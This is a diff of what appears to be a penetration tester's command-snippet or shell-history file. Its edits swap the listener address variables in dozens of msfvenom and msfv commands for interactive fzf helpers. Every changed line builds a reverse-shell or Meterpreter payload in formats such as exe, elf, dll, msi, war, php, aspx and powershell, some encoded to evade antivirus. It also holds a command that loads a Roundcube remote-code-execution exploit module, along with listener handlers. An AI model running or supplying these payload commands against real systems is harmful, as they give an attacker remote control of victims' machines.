@@ -1,14 +1,14 @@
 msf
 msf -q
 msf -r /workspace/exploit.rc
-msfv -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o /workspace/payload.exe
-msfv -p linux/x86/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o /workspace/payload.elf
-msfv -p windows/x64/meterpreter/reverse_https LHOST="$LHOST" LPORT=443 -f exe -o /workspace/payload.exe
-msfv -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f powershell -o /workspace/payload.ps1
-msfv -p cmd/unix/reverse_bash LHOST="$LHOST" LPORT="$LPORT" -f raw
-msfv -p java/jsp_shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f war -o /workspace/shell.war
-msfv -p php/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f raw -o /workspace/shell.php
-msfv -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -e x86/shikata_ga_nai -i 5 -f exe -o /workspace/payload.exe
+msfv -p windows/meterpreter/reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f exe -o /workspace/payload.exe
+msfv -p linux/x86/meterpreter/reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f elf -o /workspace/payload.elf
+msfv -p windows/x64/meterpreter/reverse_https LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f exe -o /workspace/payload.exe
+msfv -p windows/meterpreter/reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f powershell -o /workspace/payload.ps1
+msfv -p cmd/unix/reverse_bash LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f raw
+msfv -p java/jsp_shell_reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f war -o /workspace/shell.war
+msfv -p php/meterpreter/reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f raw -o /workspace/shell.php
+msfv -p windows/meterpreter/reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -e x86/shikata_ga_nai -i 5 -f exe -o /workspace/payload.exe
 msfv -l payloads
 msfv -l encoders
 msfv -l formats
@@ -18,33 +18,33 @@ msfdb stop
 msfdb status
 msfdb reinit
 service postgresql start
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$ATTACKER_IP" LPORT=1337 -f elf > meterpreter.elf
-msfvenom -p linux/x86/shell_reverse_tcp LHOST="$ATTACKER_IP" LPORT=1337 -f elf > shell.elf
-msfvenom -p windows/meterpreter/reverse_tcp LHOST="$ATTACKER_IP" LPORT=1337 -f exe > meterpreter.exe
-msfvenom -p windows/shell_reverse_tcp LHOST="$ATTACKER_IP" LPORT=1337 -f exe > shell.exe
-msfvenom -p windows/x64/shell_reverse_tcp LHOST="$ATTACKER_IP" LPORT=1337 -f exe -o reverse.exe
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f dll > backupscript.dll
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f elf > meterpreter.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f elf > shell.elf
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f exe > meterpreter.exe
+msfvenom -p windows/shell_reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f exe > shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f exe -o reverse.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f dll > backupscript.dll
 msfconsole -q -x "use exploit/multi/http/roundcube_auth_rce_cve_2025_49113"
-msfvenom -p java/jsp_shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f war > shell.war
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o shell.elf
-msfvenom -p linux/x86/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf > shell.elf
-msfvenom -p linux/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o shell.elf
-msfvenom -p windows/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o shell.exe
-msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o shell.exe
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o shell.exe
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST="$LHOST" LPORT="$LPORT" -f exe -o shell.exe
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f dll -o shell.dll
-msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f dll -o shell.dll
+msfvenom -p java/jsp_shell_reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f war > shell.war
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f elf -o shell.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f elf > shell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f elf -o shell.elf
+msfvenom -p windows/shell_reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f dll -o shell.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f dll -o shell.dll
 msfvenom -p windows/x64/exec cmd="$COMMAND" -f dll -o payload.dll
-msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f msi -o shell.msi
-msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f asp > shell.asp
-msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f aspx > shell.aspx
-msfvenom -p java/jsp_shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f raw > shell.jsp
-msfvenom -p php/reverse_php LHOST="$LHOST" LPORT="$LPORT" -o shell.php
-msfvenom -p cmd/unix/reverse_bash LHOST="$LHOST" LPORT="$LPORT"
-msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -e x64/xor -i 5 -f exe -o shell.exe
-msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -k -e x86/shikata_ga_nai -a x86 --platform windows -f exe -o shell.exe -i 5
+msfvenom -p windows/x64/shell_reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f msi -o shell.msi
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f asp > shell.asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f aspx > shell.aspx
+msfvenom -p java/jsp_shell_reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f raw > shell.jsp
+msfvenom -p php/reverse_php LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -o shell.php
+msfvenom -p cmd/unix/reverse_bash LHOST="$(fzf-ip)" LPORT="$(fzf-lport)"
+msfvenom -p windows/x64/shell_reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -e x64/xor -i 5 -f exe -o shell.exe
+msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -k -e x86/shikata_ga_nai -a x86 --platform windows -f exe -o shell.exe -i 5
 msfconsole -q
 msfconsole -r handler.rc
-meterpreter_handler_linux "$LHOST" "$LPORT"
-meterpreter_handler_windows "$LHOST" "$LPORT"
+meterpreter_handler_linux "$(fzf-ip)" "$(fzf-lport)"
+meterpreter_handler_windows "$(fzf-ip)" "$(fzf-lport)"
